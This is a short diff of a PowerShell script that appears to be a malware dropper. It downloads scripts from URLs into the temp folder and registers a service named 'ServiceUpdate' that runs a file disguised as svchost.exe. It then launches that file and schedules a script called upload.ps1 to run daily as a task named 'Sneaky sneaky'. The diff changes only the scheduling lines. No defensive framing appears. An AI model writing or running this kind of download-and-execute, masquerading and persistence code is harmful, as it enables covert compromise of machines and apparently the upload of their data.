@@ -6,6 +6,6 @@ Invoke-WebRequest -Uri $url2 -OutFile "$env:temp\AutoRun.ps1"
 Invoke-WebRequest -Uri $url3 -OutFile "$env:temp\upload.ps1"
 & "$env:temp\AutoRun.ps1" -name "ServiceUpdate" -run "$env:temp\svchost.exe" -description "Service Updater"
 Start-Process -Filepath "$env:temp\svchost.exe"
-$Trigger = New-ScheduledTaskTrigger -At 10:00am -Daily
+$Starter = New-ScheduledTaskTrigger  -Daily -At 10:00am
 $Action = New-ScheduledTaskAction -Execute "upload.ps1"
-Register-ScheduledJob -Name "Sneaky sneaky" -Trigger $Trigger -Action $Action -RunLevel Highest -Force
+Register-ScheduledTask -TaskName "Sneaky sneaky" -Trigger $Starter -Action $Action -Force
